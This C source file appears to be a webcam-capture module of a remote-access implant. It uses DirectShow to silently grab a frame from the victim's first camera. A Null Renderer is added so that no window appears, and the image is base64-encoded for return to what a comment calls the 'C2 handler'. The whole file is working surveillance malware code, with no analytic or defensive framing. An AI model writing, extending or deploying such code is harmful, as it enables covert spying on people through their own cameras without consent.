#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <dshow.h>
#include <strmif.h>
#include <control.h>

// Forward declarations and GUIDs for ISampleGrabber
DEFINE_GUID(CLSID_SampleGrabber, 0xC1F400A0, 0x3F08, 0x11d3, 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37);
DEFINE_GUID(IID_ISampleGrabber, 0x6B652FFF, 0x11FE, 0x4fce, 0x92, 0xAD, 0x02, 0x66, 0xB5, 0xD7, 0xC7, 0x8F);
DEFINE_GUID(IID_ISampleGrabberCB, 0x0579154A, 0x2B53, 0x4994, 0xB0, 0xD0, 0xE7, 0x73, 0x14, 0x8E, 0xFF, 0x85);
DEFINE_GUID(CLSID_NullRenderer, 0xC1F400A4, 0x3F08, 0x11d3, 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37);

// ISampleGrabberCB interface declaration
#undef INTERFACE
#define INTERFACE ISampleGrabberCB
DECLARE_INTERFACE_(ISampleGrabberCB, IUnknown)
{
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void **ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(SampleCB)(THIS_ double SampleTime, IMediaSample *pSample) PURE;
    STDMETHOD(BufferCB)(THIS_ double SampleTime, BYTE *pBuffer, long BufferLen) PURE;
};
#undef INTERFACE

// ISampleGrabber interface declaration
#undef INTERFACE
#define INTERFACE ISampleGrabber
DECLARE_INTERFACE_(ISampleGrabber, IUnknown)
{
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void **ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(SetOneShot)(THIS_ BOOL OneShot) PURE;
    STDMETHOD(SetMediaType)(THIS_ const AM_MEDIA_TYPE *pType) PURE;
    STDMETHOD(GetConnectedMediaType)(THIS_ AM_MEDIA_TYPE *pType) PURE;
    STDMETHOD(SetBufferSamples)(THIS_ BOOL BufferThem) PURE;
    STDMETHOD(GetCurrentBuffer)(THIS_ long *pBufferSize, long *pBuffer) PURE;
    STDMETHOD(GetCurrentSample)(THIS_ IMediaSample **ppSample) PURE;
    STDMETHOD(SetCallback)(THIS_ ISampleGrabberCB *pCallback, long WhichMethodToCallback) PURE;
};
#undef INTERFACE

// Structure to hold camera capture data
typedef struct {
    unsigned char* data;
    DWORD size;
    int width;
    int height;
} CameraCaptureData;

// Helper to save bitmap to memory (similar to screenshot)
static HRESULT SaveBitmapToMemory(BITMAPINFOHEADER* bmpInfo, BYTE* bitmapData, CameraCaptureData* capture) {
    if (!bmpInfo || !bitmapData || !capture) {
        return E_FAIL;
    }

    // Calculate bitmap data size
    DWORD dwBmpSize = ((bmpInfo->biWidth * bmpInfo->biBitCount + 31) / 32) * 4 * abs(bmpInfo->biHeight);
    DWORD dwTotalSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // Allocate memory for the bitmap data with headers
    capture->data = (unsigned char*)malloc(dwTotalSize);
    if (!capture->data) {
        return E_OUTOFMEMORY;
    }

    capture->size = dwTotalSize;
    capture->width = bmpInfo->biWidth;
    capture->height = abs(bmpInfo->biHeight);

    // Create bitmap file header
    BITMAPFILEHEADER bmfHeader;
    bmfHeader.bfType = 0x4D42; // "BM"
    bmfHeader.bfSize = dwTotalSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // Copy headers and data to memory
    memcpy(capture->data, &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(capture->data + sizeof(BITMAPFILEHEADER), bmpInfo, sizeof(BITMAPINFOHEADER));
    memcpy(capture->data + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), bitmapData, dwBmpSize);

    return S_OK;
}

// Sample Grabber callback interface
typedef struct {
    ISampleGrabberCB ISampleGrabberCB_iface;
    LONG ref;
    BYTE* buffer;
    LONG bufferSize;
    BOOL captured;
    BITMAPINFOHEADER bmpInfo;
} SampleGrabberCallback;

// IUnknown implementation
static HRESULT STDMETHODCALLTYPE SampleGrabberCallback_QueryInterface(ISampleGrabberCB* This, REFIID riid, void** ppv) {
    if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_ISampleGrabberCB)) {
        *ppv = This;
        This->lpVtbl->AddRef(This);
        return S_OK;
    }
    *ppv = NULL;
    return E_NOINTERFACE;
}

static ULONG STDMETHODCALLTYPE SampleGrabberCallback_AddRef(ISampleGrabberCB* This) {
    SampleGrabberCallback* callback = (SampleGrabberCallback*)This;
    return InterlockedIncrement(&callback->ref);
}

static ULONG STDMETHODCALLTYPE SampleGrabberCallback_Release(ISampleGrabberCB* This) {
    SampleGrabberCallback* callback = (SampleGrabberCallback*)This;
    ULONG ref = InterlockedDecrement(&callback->ref);
    if (ref == 0) {
        if (callback->buffer) {
            free(callback->buffer);
        }
        free(callback);
    }
    return ref;
}

// Sample grabber callback method
static HRESULT STDMETHODCALLTYPE SampleGrabberCallback_SampleCB(ISampleGrabberCB* This __attribute__((unused)), double time __attribute__((unused)), IMediaSample* pSample __attribute__((unused))) {
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE SampleGrabberCallback_BufferCB(ISampleGrabberCB* This __attribute__((unused)), double time __attribute__((unused)), BYTE* pBuffer, long bufferLen) {
    SampleGrabberCallback* callback = (SampleGrabberCallback*)This;
    
    if (callback->captured) {
        return S_OK;  // Already captured
    }

    // Copy buffer data
    if (!callback->buffer) {
        callback->buffer = (BYTE*)malloc(bufferLen);
        if (!callback->buffer) {
            return E_OUTOFMEMORY;
        }
        callback->bufferSize = bufferLen;
        memcpy(callback->buffer, pBuffer, bufferLen);
        callback->captured = TRUE;
    }

    return S_OK;
}

// VTable for ISampleGrabberCB
static ISampleGrabberCBVtbl SampleGrabberCallback_Vtbl = {
    SampleGrabberCallback_QueryInterface,
    SampleGrabberCallback_AddRef,
    SampleGrabberCallback_Release,
    SampleGrabberCallback_SampleCB,
    SampleGrabberCallback_BufferCB
};

// Create sample grabber callback
static SampleGrabberCallback* CreateSampleGrabberCallback(void) {
    SampleGrabberCallback* callback = (SampleGrabberCallback*)malloc(sizeof(SampleGrabberCallback));
    if (!callback) {
        return NULL;
    }

    callback->ISampleGrabberCB_iface.lpVtbl = &SampleGrabberCallback_Vtbl;
    callback->ref = 1;
    callback->buffer = NULL;
    callback->bufferSize = 0;
    callback->captured = FALSE;
    memset(&callback->bmpInfo, 0, sizeof(BITMAPINFOHEADER));

    return callback;
}

// Function to capture image from camera
CameraCaptureData* CaptureCameraImage(void) {
    CameraCaptureData* capture = NULL;
    HRESULT hr = S_OK;
    IGraphBuilder* pGraph = NULL;
    ICaptureGraphBuilder2* pBuild = NULL;
    IBaseFilter* pCap = NULL;
    IBaseFilter* pSampleGrabberFilter = NULL;
    ISampleGrabber* pSampleGrabber = NULL;
    IMediaControl* pControl = NULL;
    ICreateDevEnum* pDevEnum = NULL;
    IEnumMoniker* pEnum = NULL;
    IMoniker* pMoniker = NULL;
    SampleGrabberCallback* pCallback = NULL;
    AM_MEDIA_TYPE mt;
    VIDEOINFOHEADER* pVih = NULL;

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        return NULL;
    }

    // Create capture graph builder
    hr = CoCreateInstance(&CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_ICaptureGraphBuilder2, (void**)&pBuild);
    if (FAILED(hr)) goto cleanup;

    // Create filter graph manager
    hr = CoCreateInstance(&CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IGraphBuilder, (void**)&pGraph);
    if (FAILED(hr)) goto cleanup;

    // Attach the filter graph to the capture graph
    hr = pBuild->lpVtbl->SetFiltergraph(pBuild, pGraph);
    if (FAILED(hr)) goto cleanup;

    // Create system device enumerator
    hr = CoCreateInstance(&CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
                          &IID_ICreateDevEnum, (void**)&pDevEnum);
    if (FAILED(hr)) goto cleanup;

    // Create enumerator for video capture devices
    hr = pDevEnum->lpVtbl->CreateClassEnumerator(pDevEnum, &CLSID_VideoInputDeviceCategory, &pEnum, 0);
    if (FAILED(hr) || pEnum == NULL) goto cleanup;

    // Get first camera device
    hr = pEnum->lpVtbl->Next(pEnum, 1, &pMoniker, NULL);
    if (hr != S_OK) goto cleanup;

    // Bind moniker to filter
    hr = pMoniker->lpVtbl->BindToObject(pMoniker, NULL, NULL, &IID_IBaseFilter, (void**)&pCap);
    if (FAILED(hr)) goto cleanup;

    // Add capture filter to graph
    hr = pGraph->lpVtbl->AddFilter(pGraph, pCap, L"Capture");
    if (FAILED(hr)) goto cleanup;

    // Create sample grabber filter
    hr = CoCreateInstance(&CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IBaseFilter, (void**)&pSampleGrabberFilter);
    if (FAILED(hr)) goto cleanup;

    hr = pGraph->lpVtbl->AddFilter(pGraph, pSampleGrabberFilter, L"Sample Grabber");
    if (FAILED(hr)) goto cleanup;

    // Get ISampleGrabber interface
    hr = pSampleGrabberFilter->lpVtbl->QueryInterface(pSampleGrabberFilter, &IID_ISampleGrabber, (void**)&pSampleGrabber);
    if (FAILED(hr)) goto cleanup;

    // Set media type for sample grabber (RGB24)
    ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
    mt.majortype = MEDIATYPE_Video;
    mt.subtype = MEDIASUBTYPE_RGB24;
    hr = pSampleGrabber->lpVtbl->SetMediaType(pSampleGrabber, &mt);
    if (FAILED(hr)) goto cleanup;

    // Create Null Renderer to prevent window display
    IBaseFilter* pNullRenderer = NULL;
    hr = CoCreateInstance(&CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IBaseFilter, (void**)&pNullRenderer);
    if (FAILED(hr)) goto cleanup;

    hr = pGraph->lpVtbl->AddFilter(pGraph, pNullRenderer, L"Null Renderer");
    if (FAILED(hr)) {
        pNullRenderer->lpVtbl->Release(pNullRenderer);
        goto cleanup;
    }

    // Connect filters: Capture -> SampleGrabber -> NullRenderer (no visible window)
    hr = pBuild->lpVtbl->RenderStream(pBuild, &PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, 
                                      (IUnknown*)pCap, pSampleGrabberFilter, pNullRenderer);
    
    // Release null renderer as we're done with it
    if (pNullRenderer) pNullRenderer->lpVtbl->Release(pNullRenderer);
    
    if (FAILED(hr)) goto cleanup;

    // Get connected media type
    hr = pSampleGrabber->lpVtbl->GetConnectedMediaType(pSampleGrabber, &mt);
    if (FAILED(hr)) goto cleanup;

    pVih = (VIDEOINFOHEADER*)mt.pbFormat;
    
    // Create callback
    pCallback = CreateSampleGrabberCallback();
    if (!pCallback) goto cleanup;

    // Setup bitmap info
    pCallback->bmpInfo.biSize = sizeof(BITMAPINFOHEADER);
    pCallback->bmpInfo.biWidth = pVih->bmiHeader.biWidth;
    pCallback->bmpInfo.biHeight = pVih->bmiHeader.biHeight;
    pCallback->bmpInfo.biPlanes = 1;
    pCallback->bmpInfo.biBitCount = 24;
    pCallback->bmpInfo.biCompression = BI_RGB;
    pCallback->bmpInfo.biSizeImage = 0;

    // Set callback
    hr = pSampleGrabber->lpVtbl->SetCallback(pSampleGrabber, (ISampleGrabberCB*)pCallback, 1);
    if (FAILED(hr)) goto cleanup;

    // Set buffer mode
    hr = pSampleGrabber->lpVtbl->SetBufferSamples(pSampleGrabber, FALSE);
    if (FAILED(hr)) goto cleanup;

    // Get media control interface
    hr = pGraph->lpVtbl->QueryInterface(pGraph, &IID_IMediaControl, (void**)&pControl);
    if (FAILED(hr)) goto cleanup;

    // Run the graph
    hr = pControl->lpVtbl->Run(pControl);
    if (FAILED(hr)) goto cleanup;

    // Wait for capture (max 5 seconds)
    int timeout = 50;  // 5 seconds
    while (!pCallback->captured && timeout > 0) {
        Sleep(100);
        timeout--;
    }

    // Stop the graph
    pControl->lpVtbl->Stop(pControl);

    // Check if we captured something
    if (pCallback->captured && pCallback->buffer) {
        capture = (CameraCaptureData*)malloc(sizeof(CameraCaptureData));
        if (capture) {
            hr = SaveBitmapToMemory(&pCallback->bmpInfo, pCallback->buffer, capture);
            if (FAILED(hr)) {
                free(capture);
                capture = NULL;
            }
        }
    }

cleanup:
    // Release media type
    if (mt.pbFormat) {
        CoTaskMemFree(mt.pbFormat);
    }

    // Release interfaces
    if (pCallback) {
        pCallback->ISampleGrabberCB_iface.lpVtbl->Release((ISampleGrabberCB*)pCallback);
    }
    if (pControl) pControl->lpVtbl->Release(pControl);
    if (pSampleGrabber) pSampleGrabber->lpVtbl->Release(pSampleGrabber);
    if (pSampleGrabberFilter) pSampleGrabberFilter->lpVtbl->Release(pSampleGrabberFilter);
    if (pCap) pCap->lpVtbl->Release(pCap);
    if (pMoniker) pMoniker->lpVtbl->Release(pMoniker);
    if (pEnum) pEnum->lpVtbl->Release(pEnum);
    if (pDevEnum) pDevEnum->lpVtbl->Release(pDevEnum);
    if (pBuild) pBuild->lpVtbl->Release(pBuild);
    if (pGraph) pGraph->lpVtbl->Release(pGraph);

    CoUninitialize();

    return capture;
}

// Function to free camera capture memory
void FreeCameraCapture(CameraCaptureData* capture) {
    if (capture != NULL) {
        if (capture->data != NULL) {
            free(capture->data);
        }
        free(capture);
    }
}

// Main entry point for camera capture (called from C2 handler)
char* start_camera_capture(void) {
    CameraCaptureData* capture = CaptureCameraImage();
    
    if (!capture || !capture->data) {
        FreeCameraCapture(capture);
        return strdup("failed");
    }

    // Encode to base64
    char* base64_data = base64_encode(capture->data, capture->size);
    
    // Free capture data
    FreeCameraCapture(capture);
    
    if (!base64_data) {
        return strdup("failed");
    }
    
    return base64_data;
}
